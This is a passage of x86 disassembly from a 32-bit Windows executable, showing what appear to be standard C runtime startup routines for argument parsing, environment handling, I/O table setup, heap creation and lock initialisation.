  424c33:	push   ebx
  424c34:	mov    ebx,DWORD PTR [ebp+0xc]
  424c37:	xor    edx,edx
  424c39:	cmp    DWORD PTR [ebp+0x8],edx
  424c3c:	push   edi
  424c3d:	mov    DWORD PTR [esi],edx
  424c3f:	mov    edi,ecx
  424c41:	mov    DWORD PTR [ebx],0x1
  424c47:	je     0x424c52
  424c49:	mov    ecx,DWORD PTR [ebp+0x8]
  424c4c:	add    DWORD PTR [ebp+0x8],0x4
  424c50:	mov    DWORD PTR [ecx],edi
  424c52:	cmp    BYTE PTR [eax],0x22
  424c55:	jne    0x424c65
  424c57:	xor    ecx,ecx
  424c59:	test   edx,edx
  424c5b:	sete   cl
  424c5e:	inc    eax
  424c5f:	mov    edx,ecx
  424c61:	mov    cl,0x22
  424c63:	jmp    0x424c92
  424c65:	inc    DWORD PTR [esi]
  424c67:	test   edi,edi
  424c69:	je     0x424c70
  424c6b:	mov    cl,BYTE PTR [eax]
  424c6d:	mov    BYTE PTR [edi],cl
  424c6f:	inc    edi
  424c70:	mov    cl,BYTE PTR [eax]
  424c72:	movzx  ebx,cl
  424c75:	inc    eax
  424c76:	test   BYTE PTR [ebx+0x45df21],0x4
  424c7d:	je     0x424c8b
  424c7f:	inc    DWORD PTR [esi]
  424c81:	test   edi,edi
  424c83:	je     0x424c8a
  424c85:	mov    bl,BYTE PTR [eax]
  424c87:	mov    BYTE PTR [edi],bl
  424c89:	inc    edi
  424c8a:	inc    eax
  424c8b:	test   cl,cl
  424c8d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c90:	je     0x424cc4
  424c92:	test   edx,edx
  424c94:	jne    0x424c52
  424c96:	cmp    cl,0x20
  424c99:	je     0x424ca0
  424c9b:	cmp    cl,0x9
  424c9e:	jne    0x424c52
  424ca0:	test   edi,edi
  424ca2:	je     0x424ca8
  424ca4:	and    BYTE PTR [edi-0x1],0x0
  424ca8:	and    DWORD PTR [ebp-0x4],0x0
  424cac:	cmp    BYTE PTR [eax],0x0
  424caf:	je     0x424d8b
  424cb5:	mov    cl,BYTE PTR [eax]
  424cb7:	cmp    cl,0x20
  424cba:	je     0x424cc1
  424cbc:	cmp    cl,0x9
  424cbf:	jne    0x424cc7
  424cc1:	inc    eax
  424cc2:	jmp    0x424cb5
  424cc4:	dec    eax
  424cc5:	jmp    0x424ca8
  424cc7:	cmp    BYTE PTR [eax],0x0
  424cca:	je     0x424d8b
  424cd0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cd4:	je     0x424cdf
  424cd6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cd9:	add    DWORD PTR [ebp+0x8],0x4
  424cdd:	mov    DWORD PTR [ecx],edi
  424cdf:	inc    DWORD PTR [ebx]
  424ce1:	xor    ebx,ebx
  424ce3:	inc    ebx
  424ce4:	xor    edx,edx
  424ce6:	jmp    0x424cea
  424ce8:	inc    eax
  424ce9:	inc    edx
  424cea:	cmp    BYTE PTR [eax],0x5c
  424ced:	je     0x424ce8
  424cef:	cmp    BYTE PTR [eax],0x22
  424cf2:	jne    0x424d1a
  424cf4:	test   dl,0x1
  424cf7:	jne    0x424d18
  424cf9:	cmp    DWORD PTR [ebp-0x4],0x0
  424cfd:	je     0x424d0b
  424cff:	lea    ecx,[eax+0x1]
  424d02:	cmp    BYTE PTR [ecx],0x22
  424d05:	jne    0x424d0b
  424d07:	mov    eax,ecx
  424d09:	jmp    0x424d0d
  424d0b:	xor    ebx,ebx
  424d0d:	xor    ecx,ecx
  424d0f:	cmp    DWORD PTR [ebp-0x4],ecx
  424d12:	sete   cl
  424d15:	mov    DWORD PTR [ebp-0x4],ecx
  424d18:	shr    edx,1
  424d1a:	test   edx,edx
  424d1c:	je     0x424d2b
  424d1e:	test   edi,edi
  424d20:	je     0x424d26
  424d22:	mov    BYTE PTR [edi],0x5c
  424d25:	inc    edi
  424d26:	inc    DWORD PTR [esi]
  424d28:	dec    edx
  424d29:	jne    0x424d1e
  424d2b:	mov    cl,BYTE PTR [eax]
  424d2d:	test   cl,cl
  424d2f:	je     0x424d79
  424d31:	cmp    DWORD PTR [ebp-0x4],0x0
  424d35:	jne    0x424d41
  424d37:	cmp    cl,0x20
  424d3a:	je     0x424d79
  424d3c:	cmp    cl,0x9
  424d3f:	je     0x424d79
  424d41:	test   ebx,ebx
  424d43:	je     0x424d73
  424d45:	test   edi,edi
  424d47:	je     0x424d62
  424d49:	movzx  edx,cl
  424d4c:	test   BYTE PTR [edx+0x45df21],0x4
  424d53:	je     0x424d5b
  424d55:	mov    BYTE PTR [edi],cl
  424d57:	inc    edi
  424d58:	inc    eax
  424d59:	inc    DWORD PTR [esi]
  424d5b:	mov    cl,BYTE PTR [eax]
  424d5d:	mov    BYTE PTR [edi],cl
  424d5f:	inc    edi
  424d60:	jmp    0x424d71
  424d62:	movzx  ecx,cl
  424d65:	test   BYTE PTR [ecx+0x45df21],0x4
  424d6c:	je     0x424d71
  424d6e:	inc    eax
  424d6f:	inc    DWORD PTR [esi]
  424d71:	inc    DWORD PTR [esi]
  424d73:	inc    eax
  424d74:	jmp    0x424ce1
  424d79:	test   edi,edi
  424d7b:	je     0x424d81
  424d7d:	and    BYTE PTR [edi],0x0
  424d80:	inc    edi
  424d81:	inc    DWORD PTR [esi]
  424d83:	mov    ebx,DWORD PTR [ebp+0xc]
  424d86:	jmp    0x424cac
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	test   eax,eax
  424d90:	je     0x424d95
  424d92:	and    DWORD PTR [eax],0x0
  424d95:	inc    DWORD PTR [ebx]
  424d97:	pop    edi
  424d98:	pop    ebx
  424d99:	leave  
  424d9a:	ret    
  424d9b:	push   ebp
  424d9c:	mov    ebp,esp
  424d9e:	push   ecx
  424d9f:	push   ecx
  424da0:	push   ebx
  424da1:	push   esi
  424da2:	push   edi
  424da3:	xor    edi,edi
  424da5:	cmp    DWORD PTR ds:0x45e26c,edi
  424dab:	jne    0x424db2
  424dad:	call   0x425f3c
  424db2:	and    BYTE PTR ds:0x45dc14,0x0
  424db9:	push   0x104
  424dbe:	mov    esi,0x45db10
  424dc3:	push   esi
  424dc4:	push   edi
  424dc5:	call   DWORD PTR ds:0x42906c
  424dcb:	mov    eax,ds:0x45e274
  424dd0:	cmp    eax,edi
  424dd2:	mov    DWORD PTR ds:0x45daf4,esi
  424dd8:	je     0x424de1
  424dda:	cmp    BYTE PTR [eax],0x0
  424ddd:	mov    ebx,eax
  424ddf:	jne    0x424de3
  424de1:	mov    ebx,esi
  424de3:	lea    eax,[ebp-0x4]
  424de6:	push   eax
  424de7:	push   edi
  424de8:	lea    esi,[ebp-0x8]
  424deb:	xor    ecx,ecx
  424ded:	mov    eax,ebx
  424def:	call   0x424c2f
  424df4:	mov    esi,DWORD PTR [ebp-0x4]
  424df7:	mov    eax,DWORD PTR [ebp-0x8]
  424dfa:	shl    esi,0x2
  424dfd:	add    eax,esi
  424dff:	push   eax
  424e00:	call   0x426072
  424e05:	mov    edi,eax
  424e07:	add    esp,0xc
  424e0a:	test   edi,edi
  424e0c:	jne    0x424e13
  424e0e:	or     eax,0xffffffff
  424e11:	jmp    0x424e38
  424e13:	lea    eax,[ebp-0x4]
  424e16:	push   eax
  424e17:	lea    ecx,[esi+edi*1]
  424e1a:	push   edi
  424e1b:	lea    esi,[ebp-0x8]
  424e1e:	mov    eax,ebx
  424e20:	call   0x424c2f
  424e25:	mov    eax,DWORD PTR [ebp-0x4]
  424e28:	dec    eax
  424e29:	pop    ecx
  424e2a:	mov    ds:0x45dad8,eax
  424e2f:	pop    ecx
  424e30:	mov    DWORD PTR ds:0x45dadc,edi
  424e36:	xor    eax,eax
  424e38:	pop    edi
  424e39:	pop    esi
  424e3a:	pop    ebx
  424e3b:	leave  
  424e3c:	ret    
  424e3d:	push   ecx
  424e3e:	push   ecx
  424e3f:	mov    eax,ds:0x45dc18
  424e44:	push   ebx
  424e45:	push   ebp
  424e46:	push   esi
  424e47:	push   edi
  424e48:	mov    edi,DWORD PTR ds:0x429084
  424e4e:	xor    ebx,ebx
  424e50:	xor    esi,esi
  424e52:	cmp    eax,ebx
  424e54:	push   0x2
  424e56:	pop    ebp
  424e57:	jne    0x424e86
  424e59:	call   edi
  424e5b:	mov    esi,eax
  424e5d:	cmp    esi,ebx
  424e5f:	je     0x424e6d
  424e61:	mov    DWORD PTR ds:0x45dc18,0x1
  424e6b:	jmp    0x424e8b
  424e6d:	call   DWORD PTR ds:0x429028
  424e73:	cmp    eax,0x78
  424e76:	jne    0x424e81
  424e78:	mov    eax,ebp
  424e7a:	mov    ds:0x45dc18,eax
  424e7f:	jmp    0x424e86
  424e81:	mov    eax,ds:0x45dc18
  424e86:	cmp    eax,0x1
  424e89:	jne    0x424f08
  424e8b:	cmp    esi,ebx
  424e8d:	jne    0x424e97
  424e8f:	call   edi
  424e91:	mov    esi,eax
  424e93:	cmp    esi,ebx
  424e95:	je     0x424f10
  424e97:	cmp    WORD PTR [esi],bx
  424e9a:	mov    eax,esi
  424e9c:	je     0x424eac
  424e9e:	add    eax,ebp
  424ea0:	cmp    WORD PTR [eax],bx
  424ea3:	jne    0x424e9e
  424ea5:	add    eax,ebp
  424ea7:	cmp    WORD PTR [eax],bx
  424eaa:	jne    0x424e9e
  424eac:	mov    edi,DWORD PTR ds:0x429080
  424eb2:	push   ebx
  424eb3:	push   ebx
  424eb4:	push   ebx
  424eb5:	sub    eax,esi
  424eb7:	push   ebx
  424eb8:	sar    eax,1
  424eba:	inc    eax
  424ebb:	push   eax
  424ebc:	push   esi
  424ebd:	push   ebx
  424ebe:	push   ebx
  424ebf:	mov    DWORD PTR [esp+0x34],eax
  424ec3:	call   edi
  424ec5:	mov    ebp,eax
  424ec7:	cmp    ebp,ebx
  424ec9:	je     0x424efd
  424ecb:	push   ebp
  424ecc:	call   0x426072
  424ed1:	cmp    eax,ebx
  424ed3:	pop    ecx
  424ed4:	mov    DWORD PTR [esp+0x10],eax
  424ed8:	je     0x424efd
  424eda:	push   ebx
  424edb:	push   ebx
  424edc:	push   ebp
  424edd:	push   eax
  424ede:	push   DWORD PTR [esp+0x24]
  424ee2:	push   esi
  424ee3:	push   ebx
  424ee4:	push   ebx
  424ee5:	call   edi
  424ee7:	test   eax,eax
  424ee9:	jne    0x424ef9
  424eeb:	push   DWORD PTR [esp+0x10]
  424eef:	call   0x425f5a
  424ef4:	pop    ecx
  424ef5:	mov    DWORD PTR [esp+0x10],ebx
  424ef9:	mov    ebx,DWORD PTR [esp+0x10]
  424efd:	push   esi
  424efe:	call   DWORD PTR ds:0x42907c
  424f04:	mov    eax,ebx
  424f06:	jmp    0x424f58
  424f08:	cmp    eax,ebp
  424f0a:	je     0x424f14
  424f0c:	cmp    eax,ebx
  424f0e:	je     0x424f14
  424f10:	xor    eax,eax
  424f12:	jmp    0x424f58
  424f14:	call   DWORD PTR ds:0x429078
  424f1a:	mov    esi,eax
  424f1c:	cmp    esi,ebx
  424f1e:	je     0x424f10
  424f20:	cmp    BYTE PTR [esi],bl
  424f22:	je     0x424f2e
  424f24:	inc    eax
  424f25:	cmp    BYTE PTR [eax],bl
  424f27:	jne    0x424f24
  424f29:	inc    eax
  424f2a:	cmp    BYTE PTR [eax],bl
  424f2c:	jne    0x424f24
  424f2e:	sub    eax,esi
  424f30:	inc    eax
  424f31:	mov    ebp,eax
  424f33:	push   ebp
  424f34:	call   0x426072
  424f39:	mov    edi,eax
  424f3b:	cmp    edi,ebx
  424f3d:	pop    ecx
  424f3e:	jne    0x424f44
  424f40:	xor    edi,edi
  424f42:	jmp    0x424f4f
  424f44:	push   ebp
  424f45:	push   esi
  424f46:	push   edi
  424f47:	call   0x426090
  424f4c:	add    esp,0xc
  424f4f:	push   esi
  424f50:	call   DWORD PTR ds:0x429074
  424f56:	mov    eax,edi
  424f58:	pop    edi
  424f59:	pop    esi
  424f5a:	pop    ebp
  424f5b:	pop    ebx
  424f5c:	pop    ecx
  424f5d:	pop    ecx
  424f5e:	ret    
  424f5f:	sub    esp,0x48
  424f62:	push   ebx
  424f63:	mov    ebx,0x480
  424f68:	push   ebx
  424f69:	call   0x426072
  424f6e:	test   eax,eax
  424f70:	pop    ecx
  424f71:	jne    0x424f7b
  424f73:	or     eax,0xffffffff
  424f76:	jmp    0x425158
  424f7b:	mov    ds:0x45e160,eax
  424f80:	mov    DWORD PTR ds:0x45e148,0x20
  424f8a:	lea    ecx,[eax+0x480]
  424f90:	jmp    0x424fb0
  424f92:	and    BYTE PTR [eax+0x4],0x0
  424f96:	or     DWORD PTR [eax],0xffffffff
  424f99:	and    DWORD PTR [eax+0x8],0x0
  424f9d:	mov    BYTE PTR [eax+0x5],0xa
  424fa1:	mov    ecx,DWORD PTR ds:0x45e160
  424fa7:	add    eax,0x24
  424faa:	add    ecx,0x480
  424fb0:	cmp    eax,ecx
  424fb2:	jb     0x424f92
  424fb4:	push   ebp
  424fb5:	push   esi
  424fb6:	push   edi
  424fb7:	lea    eax,[esp+0x14]
  424fbb:	push   eax
  424fbc:	call   DWORD PTR ds:0x429050
  424fc2:	cmp    WORD PTR [esp+0x46],0x0
  424fc8:	je     0x4250b7
  424fce:	mov    eax,DWORD PTR [esp+0x48]
  424fd2:	test   eax,eax
  424fd4:	je     0x4250b7
  424fda:	mov    edi,DWORD PTR [eax]
  424fdc:	lea    ebp,[eax+0x4]
  424fdf:	lea    eax,[edi+ebp*1]
  424fe2:	mov    DWORD PTR [esp+0x10],eax
  424fe6:	mov    eax,0x800
  424feb:	cmp    edi,eax
  424fed:	jl     0x424ff1
  424fef:	mov    edi,eax
  424ff1:	cmp    DWORD PTR ds:0x45e148,edi
  424ff7:	jge    0x425047
  424ff9:	mov    esi,0x45e164
  424ffe:	push   ebx
  424fff:	call   0x426072
  425004:	test   eax,eax
  425006:	pop    ecx
  425007:	je     0x425041
  425009:	add    DWORD PTR ds:0x45e148,0x20
  425010:	mov    DWORD PTR [esi],eax
  425012:	lea    ecx,[eax+0x480]
  425018:	jmp    0x425030
  42501a:	and    BYTE PTR [eax+0x4],0x0
  42501e:	or     DWORD PTR [eax],0xffffffff
  425021:	and    DWORD PTR [eax+0x8],0x0
  425025:	mov    BYTE PTR [eax+0x5],0xa
  425029:	mov    ecx,DWORD PTR [esi]
  42502b:	add    eax,0x24
  42502e:	add    ecx,ebx
  425030:	cmp    eax,ecx
  425032:	jb     0x42501a
  425034:	add    esi,0x4
  425037:	cmp    DWORD PTR ds:0x45e148,edi
  42503d:	jl     0x424ffe
  42503f:	jmp    0x425047
  425041:	mov    edi,DWORD PTR ds:0x45e148
  425047:	xor    ebx,ebx
  425049:	test   edi,edi
  42504b:	jle    0x4250b7
  42504d:	mov    eax,DWORD PTR [esp+0x10]
  425051:	mov    eax,DWORD PTR [eax]
  425053:	cmp    eax,0xffffffff
  425056:	je     0x4250ac
  425058:	mov    cl,BYTE PTR [ebp+0x0]
  42505b:	test   cl,0x1
  42505e:	je     0x4250ac
  425060:	test   cl,0x8
  425063:	jne    0x425070
  425065:	push   eax
  425066:	call   DWORD PTR ds:0x42908c
  42506c:	test   eax,eax
  42506e:	je     0x4250ac
  425070:	mov    ecx,ebx
  425072:	mov    eax,ebx
  425074:	and    eax,0x1f
  425077:	lea    eax,[eax+eax*8]
  42507a:	sar    ecx,0x5
  42507d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425084:	lea    esi,[ecx+eax*4]
  425087:	mov    eax,DWORD PTR [esp+0x10]
  42508b:	mov    eax,DWORD PTR [eax]
  42508d:	mov    DWORD PTR [esi],eax
  42508f:	mov    al,BYTE PTR [ebp+0x0]
  425092:	mov    BYTE PTR [esi+0x4],al
  425095:	lea    eax,[esi+0xc]
  425098:	push   0xfa0
  42509d:	push   eax
  42509e:	call   0x4263dd
  4250a3:	test   eax,eax
  4250a5:	pop    ecx
  4250a6:	pop    ecx
  4250a7:	je     0x4250d7
  4250a9:	inc    DWORD PTR [esi+0x8]
  4250ac:	add    DWORD PTR [esp+0x10],0x4
  4250b1:	inc    ebx
  4250b2:	inc    ebp
  4250b3:	cmp    ebx,edi
  4250b5:	jl     0x42504d
  4250b7:	xor    ebx,ebx
  4250b9:	mov    ecx,DWORD PTR ds:0x45e160
  4250bf:	lea    eax,[ebx+ebx*8]
  4250c2:	lea    esi,[ecx+eax*4]
  4250c5:	cmp    DWORD PTR [esi],0xffffffff
  4250c8:	jne    0x425139
  4250ca:	test   ebx,ebx
  4250cc:	mov    BYTE PTR [esi+0x4],0x81
  4250d0:	jne    0x4250dc
  4250d2:	push   0xfffffff6
  4250d4:	pop    eax
  4250d5:	jmp    0x4250e6
  4250d7:	or     eax,0xffffffff
  4250da:	jmp    0x425155
  4250dc:	mov    eax,ebx
  4250de:	dec    eax
  4250df:	neg    eax
  4250e1:	sbb    eax,eax
  4250e3:	add    eax,0xfffffff5
  4250e6:	push   eax
  4250e7:	call   DWORD PTR ds:0x429068
  4250ed:	mov    edi,eax
  4250ef:	cmp    edi,0xffffffff
  4250f2:	je     0x425133
  4250f4:	push   edi
  4250f5:	call   DWORD PTR ds:0x42908c
  4250fb:	test   eax,eax
  4250fd:	je     0x425133
  4250ff:	and    eax,0xff
  425104:	cmp    eax,0x2
  425107:	mov    DWORD PTR [esi],edi
  425109:	jne    0x425111
  42510b:	or     BYTE PTR [esi+0x4],0x40
  42510f:	jmp    0x42511a
  425111:	cmp    eax,0x3
  425114:	jne    0x42511a
  425116:	or     BYTE PTR [esi+0x4],0x8
  42511a:	lea    eax,[esi+0xc]
  42511d:	push   0xfa0
  425122:	push   eax
  425123:	call   0x4263dd
  425128:	test   eax,eax
  42512a:	pop    ecx
  42512b:	pop    ecx
  42512c:	je     0x4250d7
  42512e:	inc    DWORD PTR [esi+0x8]
  425131:	jmp    0x42513d
  425133:	or     BYTE PTR [esi+0x4],0x40
  425137:	jmp    0x42513d
  425139:	or     BYTE PTR [esi+0x4],0x80
  42513d:	inc    ebx
  42513e:	cmp    ebx,0x3
  425141:	jl     0x4250b9
  425147:	push   DWORD PTR ds:0x45e148
  42514d:	call   DWORD PTR ds:0x429088
  425153:	xor    eax,eax
  425155:	pop    edi
  425156:	pop    esi
  425157:	pop    ebp
  425158:	pop    ebx
  425159:	add    esp,0x48
  42515c:	ret    
  42515d:	push   0xc
  42515f:	push   0x4295b8
  425164:	call   0x425350
  425169:	mov    DWORD PTR [ebp-0x1c],0x42a010
  425170:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  425177:	jae    0x42519b
  425179:	and    DWORD PTR [ebp-0x4],0x0
  42517d:	mov    eax,DWORD PTR [ebp-0x1c]
  425180:	mov    eax,DWORD PTR [eax]
  425182:	test   eax,eax
  425184:	je     0x425191
  425186:	call   eax
  425188:	jmp    0x425191
  42518a:	xor    eax,eax
  42518c:	inc    eax
  42518d:	ret    
  42518e:	mov    esp,DWORD PTR [ebp-0x18]
  425191:	or     DWORD PTR [ebp-0x4],0xffffffff
  425195:	add    DWORD PTR [ebp-0x1c],0x4
  425199:	jmp    0x425170
  42519b:	call   0x42538b
  4251a0:	ret    
  4251a1:	push   0xc
  4251a3:	push   0x4295c8
  4251a8:	call   0x425350
  4251ad:	mov    DWORD PTR [ebp-0x1c],0x42a018
  4251b4:	cmp    DWORD PTR [ebp-0x1c],0x42a018
  4251bb:	jae    0x4251df
  4251bd:	and    DWORD PTR [ebp-0x4],0x0
  4251c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251c4:	mov    eax,DWORD PTR [eax]
  4251c6:	test   eax,eax
  4251c8:	je     0x4251d5
  4251ca:	call   eax
  4251cc:	jmp    0x4251d5
  4251ce:	xor    eax,eax
  4251d0:	inc    eax
  4251d1:	ret    
  4251d2:	mov    esp,DWORD PTR [ebp-0x18]
  4251d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251d9:	add    DWORD PTR [ebp-0x1c],0x4
  4251dd:	jmp    0x4251b4
  4251df:	call   0x42538b
  4251e4:	ret    
  4251e5:	call   0x425426
  4251ea:	mov    eax,ds:0x45d304
  4251ef:	cmp    eax,0xffffffff
  4251f2:	je     0x425202
  4251f4:	push   eax
  4251f5:	call   DWORD PTR ds:0x429094
  4251fb:	or     DWORD PTR ds:0x45d304,0xffffffff
  425202:	ret    
  425203:	push   ebx
  425204:	push   esi
  425205:	call   DWORD PTR ds:0x429028
  42520b:	push   DWORD PTR ds:0x45d304
  425211:	mov    ebx,eax
  425213:	call   DWORD PTR ds:0x4290a4
  425219:	mov    esi,eax
  42521b:	test   esi,esi
  42521d:	jne    0x425268
  42521f:	push   0x88
  425224:	push   0x1
  425226:	call   0x426468
  42522b:	mov    esi,eax
  42522d:	test   esi,esi
  42522f:	pop    ecx
  425230:	pop    ecx
  425231:	je     0x425260
  425233:	push   esi
  425234:	push   DWORD PTR ds:0x45d304
  42523a:	call   DWORD PTR ds:0x4290a0
  425240:	test   eax,eax
  425242:	je     0x425260
  425244:	mov    DWORD PTR [esi+0x54],0x45d258
  42524b:	mov    DWORD PTR [esi+0x14],0x1
  425252:	call   DWORD PTR ds:0x42909c
  425258:	or     DWORD PTR [esi+0x4],0xffffffff
  42525c:	mov    DWORD PTR [esi],eax
  42525e:	jmp    0x425268
  425260:	push   0x10
  425262:	call   0x424416
  425267:	pop    ecx
  425268:	push   ebx
  425269:	call   DWORD PTR ds:0x429098
  42526f:	mov    eax,esi
  425271:	pop    esi
  425272:	pop    ebx
  425273:	ret    
  425274:	call   0x4253dd
  425279:	test   eax,eax
  42527b:	je     0x42528d
  42527d:	call   DWORD PTR ds:0x4290a8
  425283:	cmp    eax,0xffffffff
  425286:	mov    ds:0x45d304,eax
  42528b:	jne    0x425295
  42528d:	call   0x4251e5
  425292:	xor    eax,eax
  425294:	ret    
  425295:	push   esi
  425296:	push   0x88
  42529b:	push   0x1
  42529d:	call   0x426468
  4252a2:	mov    esi,eax
  4252a4:	test   esi,esi
  4252a6:	pop    ecx
  4252a7:	pop    ecx
  4252a8:	je     0x4252da
  4252aa:	push   esi
  4252ab:	push   DWORD PTR ds:0x45d304
  4252b1:	call   DWORD PTR ds:0x4290a0
  4252b7:	test   eax,eax
  4252b9:	je     0x4252da
  4252bb:	mov    DWORD PTR [esi+0x54],0x45d258
  4252c2:	mov    DWORD PTR [esi+0x14],0x1
  4252c9:	call   DWORD PTR ds:0x42909c
  4252cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252d3:	mov    DWORD PTR [esi],eax
  4252d5:	xor    eax,eax
  4252d7:	inc    eax
  4252d8:	pop    esi
  4252d9:	ret    
  4252da:	call   0x4251e5
  4252df:	xor    eax,eax
  4252e1:	pop    esi
  4252e2:	ret    
  4252e3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252ea:	jne    0x4252f9
  4252ec:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252f3:	jb     0x4252f9
  4252f5:	xor    eax,eax
  4252f7:	inc    eax
  4252f8:	ret    
  4252f9:	push   0x3
  4252fb:	pop    eax
  4252fc:	ret    
  4252fd:	xor    eax,eax
  4252ff:	cmp    DWORD PTR [esp+0x4],eax
  425303:	push   0x0
  425305:	sete   al
  425308:	push   0x1000
  42530d:	push   eax
  42530e:	call   DWORD PTR ds:0x429034
  425314:	test   eax,eax
  425316:	mov    ds:0x45e140,eax
  42531b:	je     0x425347
  42531d:	call   0x4252e3
  425322:	cmp    eax,0x3
  425325:	mov    ds:0x45e144,eax
  42532a:	jne    0x42534a
  42532c:	push   0x3f8
  425331:	call   0x4266ea
  425336:	test   eax,eax
  425338:	pop    ecx
  425339:	jne    0x42534a
  42533b:	push   DWORD PTR ds:0x45e140
  425341:	call   DWORD PTR ds:0x4290ac
  425347:	xor    eax,eax
  425349:	ret    
  42534a:	xor    eax,eax
  42534c:	inc    eax
  42534d:	ret    
  42534e:	int3   
  42534f:	int3   
  425350:	push   0x427218
  425355:	mov    eax,fs:0x0
  42535b:	push   eax
  42535c:	mov    eax,DWORD PTR [esp+0x10]
  425360:	mov    DWORD PTR [esp+0x10],ebp
  425364:	lea    ebp,[esp+0x10]
  425368:	sub    esp,eax
  42536a:	push   ebx
  42536b:	push   esi
  42536c:	push   edi
  42536d:	mov    eax,DWORD PTR [ebp-0x8]
  425370:	mov    DWORD PTR [ebp-0x18],esp
  425373:	push   eax
  425374:	mov    eax,DWORD PTR [ebp-0x4]
  425377:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42537e:	mov    DWORD PTR [ebp-0x8],eax
  425381:	lea    eax,[ebp-0x10]
  425384:	mov    fs:0x0,eax
  42538a:	ret    
  42538b:	mov    ecx,DWORD PTR [ebp-0x10]
  42538e:	mov    DWORD PTR fs:0x0,ecx
  425395:	pop    ecx
  425396:	pop    edi
  425397:	pop    esi
  425398:	pop    ebx
  425399:	leave  
  42539a:	push   ecx
  42539b:	ret    
  42539c:	int3   
  42539d:	int3   
  42539e:	int3   
  42539f:	int3   
  4253a0:	cmp    eax,0x1000
  4253a5:	jae    0x4253b5
  4253a7:	neg    eax
  4253a9:	add    eax,esp
  4253ab:	add    eax,0x4
  4253ae:	test   DWORD PTR [eax],eax
  4253b0:	xchg   esp,eax
  4253b1:	mov    eax,DWORD PTR [eax]
  4253b3:	push   eax
  4253b4:	ret    
  4253b5:	push   ecx
  4253b6:	lea    ecx,[esp+0x8]
  4253ba:	sub    ecx,0x1000
  4253c0:	sub    eax,0x1000
  4253c5:	test   DWORD PTR [ecx],eax
  4253c7:	cmp    eax,0x1000
  4253cc:	jae    0x4253ba
  4253ce:	sub    ecx,eax
  4253d0:	mov    eax,esp
  4253d2:	test   DWORD PTR [ecx],eax
  4253d4:	mov    esp,ecx
  4253d6:	mov    ecx,DWORD PTR [eax]
  4253d8:	mov    eax,DWORD PTR [eax+0x4]
  4253db:	push   eax
  4253dc:	ret    
  4253dd:	push   esi
  4253de:	push   edi
  4253df:	xor    esi,esi
  4253e1:	mov    edi,0x45dc20
  4253e6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253ee:	jne    0x42540e
  4253f0:	lea    eax,[esi*8+0x45d310]
  4253f7:	mov    DWORD PTR [eax],edi
  4253f9:	push   0xfa0
  4253fe:	push   DWORD PTR [eax]
  425400:	add    edi,0x18
  425403:	call   0x4263dd
  425408:	test   eax,eax
  42540a:	pop    ecx
  42540b:	pop    ecx
  42540c:	je     0x42541a
  42540e:	inc    esi
  42540f:	cmp    esi,0x24
  425412:	jl     0x4253e6
  425414:	xor    eax,eax
  425416:	inc    eax
  425417:	pop    edi
  425418:	pop    esi
  425419:	ret    
  42541a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425422:	xor    eax,eax
  425424:	jmp    0x425417
  425426:	push   ebx
  425427:	mov    ebx,DWORD PTR ds:0x429090
  42542d:	push   esi
  42542e:	mov    esi,0x45d310
  425433:	push   edi
  425434:	mov    edi,DWORD PTR [esi]
  425436:	test   edi,edi
  425438:	je     0x42544d
  42543a:	cmp    DWORD PTR [esi+0x4],0x1
  42543e:	je     0x42544d
  425440:	push   edi
  425441:	call   ebx
  425443:	push   edi
  425444:	call   0x425f5a
  425449:	and    DWORD PTR [esi],0x0
  42544c:	pop    ecx
  42544d:	add    esi,0x8
  425450:	cmp    esi,0x45d430
  425456:	jl     0x425434
  425458:	mov    esi,0x45d310
  42545d:	pop    edi
  42545e:	mov    eax,DWORD PTR [esi]
  425460:	test   eax,eax
  425462:	je     0x42546d
  425464:	cmp    DWORD PTR [esi+0x4],0x1
  425468:	jne    0x42546d
  42546a:	push   eax
  42546b:	call   ebx
  42546d:	add    esi,0x8
  425470:	cmp    esi,0x45d430
  425476:	jl     0x42545e
  425478:	pop    esi
  425479:	pop    ebx
  42547a:	ret    
  42547b:	push   ebp
  42547c:	mov    ebp,esp
  42547e:	mov    eax,DWORD PTR [ebp+0x8]
  425481:	push   DWORD PTR [eax*8+0x45d310]
  425488:	call   DWORD PTR ds:0x4290b4
  42548e:	pop    ebp
  42548f:	ret    
  425490:	push   ebp
  425491:	mov    ebp,esp
  425493:	push   esi
  425494:	mov    esi,DWORD PTR [ebp+0x8]
  425497:	lea    esi,[esi*8+0x45d310]
  42549e:	cmp    DWORD PTR [esi],0x0
  4254a1:	je     0x4254a8
  4254a3:	xor    eax,eax
  4254a5:	inc    eax
  4254a6:	jmp    0x42550c
  4254a8:	push   edi
  4254a9:	push   0x18
  4254ab:	call   0x426072
  4254b0:	mov    edi,eax
  4254b2:	test   edi,edi
  4254b4:	pop    ecx
  4254b5:	jne    0x4254c6
  4254b7:	call   0x4272f0
  4254bc:	mov    DWORD PTR [eax],0xc
  4254c2:	xor    eax,eax
  4254c4:	jmp    0x42550b
  4254c6:	push   0xa
  4254c8:	call   0x42550f
  4254cd:	cmp    DWORD PTR [esi],0x0
  4254d0:	pop    ecx
  4254d1:	jne    0x4254f9
  4254d3:	push   0xfa0
  4254d8:	push   edi
  4254d9:	call   0x4263dd
  4254de:	test   eax,eax
  4254e0:	pop    ecx
  4254e1:	pop    ecx
  4254e2:	jne    0x4254f5
  4254e4:	push   edi
  4254e5:	call   0x425f5a
  4254ea:	push   0xa
  4254ec:	call   0x42547b
  4254f1:	pop    ecx
  4254f2:	pop    ecx
  4254f3:	jmp    0x4254b7
  4254f5:	mov    DWORD PTR [esi],edi
  4254f7:	jmp    0x425500
  4254f9:	push   edi
  4254fa:	call   0x425f5a
  4254ff:	pop    ecx
  425500:	push   0xa
  425502:	call   0x42547b
  425507:	xor    eax,eax
  425509:	pop    ecx
  42550a:	inc    eax
  42550b:	pop    edi
  42550c:	pop    esi
  42550d:	pop    ebp
  42550e:	ret    
  42550f:	push   ebp
  425510:	mov    ebp,esp
  425512:	mov    eax,DWORD PTR [ebp+0x8]
  425515:	push   esi
